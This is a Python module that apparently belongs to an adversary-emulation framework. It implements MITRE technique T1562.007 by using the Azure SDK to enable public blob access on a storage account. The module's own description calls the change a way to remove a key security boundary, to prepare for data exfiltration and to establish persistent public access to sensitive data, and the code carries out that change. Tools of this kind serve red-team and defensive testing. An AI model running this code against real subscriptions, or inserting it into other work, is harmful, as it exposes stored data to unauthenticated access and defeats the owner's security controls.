from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.mgmt.storage import StorageManagementClient
from core.azure.azure_access import AzureAccess

@TechniqueRegistry.register
class AzureEnableStorageAccountPublicAccess(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1562.007",
                technique_name="Impair Defenses",
                tactics=["Defense Evasion"],
                sub_technique_name="Disable or Modify Cloud Firewall"
            )
        ]
        super().__init__("Enable Storage Account Public Access", "Modifies Azure Storage Account security controls to enable public access at the account level, potentially exposing all contained data to unauthenticated access. This technique manipulates the AllowBlobPublicAccess property, which serves as a master switch for public access to any blob container within the storage account. When enabled, individual containers can be made publicly accessible without requiring authentication or authorization. This is a critical security modification that can lead to data exposure even if containers were previously secured, as it removes a key security boundary designed to prevent accidental public access. Use this technique to prepare for data exfiltration or to establish persistent public access to sensitive data. The change affects all existing and future containers in the storage account and may bypass organizational security policies that rely on account-level public access restrictions.", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            storage_account_name: str = kwargs["storage_account_name"]
            rg_name: str = kwargs["rg_name"]

            # Input Validation
            if storage_account_name in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Storage Account Name"}
                }
            
            if rg_name in ["", None]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": {"input_required": "Resource Group Name"}
                }

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # Create client
            storage_client = StorageManagementClient(credential, subscription_id)
            
            # Get storage account
            storage_account = storage_client.storage_accounts.get_properties(
                rg_name,
                storage_account_name
            )

            # Modify storage account configuration
            storage_account.allow_blob_public_access = True

            # Attempt to update storage account with new config
            storage_client.storage_accounts.update(
                rg_name,
                storage_account_name,
                storage_account
            )

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully enabled AllowPublicAccess for {storage_account_name}",
                "value": {
                    "storage_account_name" : storage_account_name,
                    "resource_group" : rg_name,
                    "allow_blob_public_access" : True
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": f"Failed to enabled AllowPublicAccess for {storage_account_name}"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "storage_account_name": {"type": "str", "required": True, "default": None, "name": "Storage Account Name", "input_field_type" : "text"},
            "rg_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"},
        }